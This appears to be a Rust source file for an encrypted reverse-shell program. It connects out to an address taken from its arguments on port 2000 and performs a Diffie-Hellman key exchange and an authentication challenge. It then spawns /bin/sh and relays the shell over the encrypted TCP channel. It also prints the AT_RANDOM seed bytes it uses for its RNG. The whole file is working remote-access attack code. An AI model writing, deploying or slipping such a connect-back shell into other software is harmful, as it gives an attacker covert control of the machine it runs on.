#![no_main]
#![feature(trait_alias)]

extern crate libc;
mod auxv;
mod kex;
mod relay;

#[allow(unused_imports)]
use aes_gcm::{Aes256Gcm, Key, Nonce};
#[allow(unused_imports)]
use anyhow::{anyhow, Result};
use auxv::getauxval;
use kex::{get_local_info, play_auth_challenge_remote, play_dh_kex_remote};
use rand_chacha::ChaCha20Rng;
use rand_core::SeedableRng;
use std::ffi::{c_char, CStr};
use std::net::{SocketAddr, TcpStream};
use std::os::unix::io::AsRawFd;
use std::os::unix::process::CommandExt;
use std::process::Command;

#[allow(unused_imports)]
use relay::{relay, RelayNode};

const LOCAL_PORT: u16 = 2000;

fn get_rand_seed(rand_ptr: *const u64) -> Option<u64> {
    if 0 != rand_ptr as usize {
        // Assuming everything worked out correctly, this dereference should be fine
        println!("deref rand bytes at: {:#016x}", rand_ptr as usize);
        let result = unsafe { *(rand_ptr) };
        println!("= {:#016x}", result);
        Some(result)
    } else {
        // getauxval(AT_RANDOM) is not available, use /dev/urandom
        None
    }
}

#[no_mangle]
pub fn main(argc: i32, argv: *const *const u8, envp: *const *const u8) -> i8 {
    // Build argv into rust vec
    let argv_vec = unsafe {
        let argv_vec_ptrs = std::slice::from_raw_parts(argv, argc as usize);
        argv_vec_ptrs
            .iter()
            .map(|x| {
                CStr::from_ptr(*x as *const c_char)
                    .to_string_lossy()
                    .into_owned()
            })
            .collect()
    };

    // Parse the IP addr and public key from argv
    let (ipaddr_l, pub_l) =
        get_local_info(argv_vec).expect("Failed to parse remote pub key and ip addr");
    println!(
        "Found local's key:\n{:#}\nAnd address: {:#}",
        pub_l.to_string(),
        ipaddr_l,
    );

    // Seed the RNG
    // Prefer the auxiliary vector's random data entry for seeding
    let rand_ptr = getauxval(envp, libc::AT_RANDOM as usize).unwrap_or(0) as *const u64;
    let seed1 = get_rand_seed(rand_ptr);

    // TODO: Register SIGALRM

    // Open the socket to remote
    let addr = SocketAddr::from((ipaddr_l, LOCAL_PORT));
    let mut remote = TcpStream::connect(addr).expect("Unable to connect.");

    // Get the shared AES key
    let key = play_dh_kex_remote(&mut remote, &pub_l, seed1).expect("Failed KEX");

    // Create a new rng for the challenge and nonce values
    let mut rng = if let Some(seed2) = get_rand_seed(unsafe { rand_ptr.add(1) }) {
        ChaCha20Rng::seed_from_u64(seed2)
    } else {
        println!("Unable to use seeds, using /dev/urandom");
        ChaCha20Rng::from_entropy()
    };

    // Challenge the remote
    play_auth_challenge_remote(&mut remote, &pub_l, &mut rng).expect("Failed challenge");

    // TODO: unregister SIGALRM

    // Make some pipes
    let (pipein_parent, pipein_child) = os_pipe::pipe().expect("Failed to open pipes");
    let (pipeout_child, pipeout_parent) = os_pipe::pipe().expect("Failed to open pipes");

    // Exec the shell
    Command::new("/bin/sh")
        .stdin(pipeout_child)
        .stderr(pipein_child.try_clone().expect("Failed to dup stderr"))
        .stdout(pipein_child)
        .spawn()
        .expect("Unable to start shell.");

    // Start up the relay
    let mut node1 = RelayNode {
        readable: pipein_parent,
        writeable: pipeout_parent,
    };
    relay(&mut node1, &mut remote, &key, &mut rng).expect("Finished relay");

    return 0;
}
